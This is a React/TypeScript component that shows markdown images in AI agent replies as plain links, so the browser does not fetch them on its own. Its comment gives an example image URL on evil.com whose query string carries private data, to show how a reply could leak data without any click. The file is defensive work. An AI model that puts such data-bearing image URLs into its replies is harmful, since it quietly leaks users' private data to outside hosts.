import type { ComponentPropsWithoutRef } from 'react';

// Used as ReactMarkdown's `img` renderer in agent replies.
// A rendered <img> is fetched by the browser as soon as the message appears, so a reply containing
// ![](https://evil.com/x.png?d=<private data>) would send data out without anyone clicking.
// Showing images as links means nothing is requested unless the user chooses to open it.
export const MarkdownImageLink = ({ src, alt }: ComponentPropsWithoutRef<'img'>) => {
  if (!src || typeof src !== 'string') return null;

  let host = src;
  try {
    host = new URL(src).hostname;
  } catch {
    // Not an absolute URL - show it as written
  }

  return (
    <a
      href={src}
      target="_blank"
      rel="noopener noreferrer nofollow"
      title={src}
      className="underline break-all"
    >
      🖼 {alt ? `${alt} (${host})` : `image: ${host}`}
    </a>
  );
};
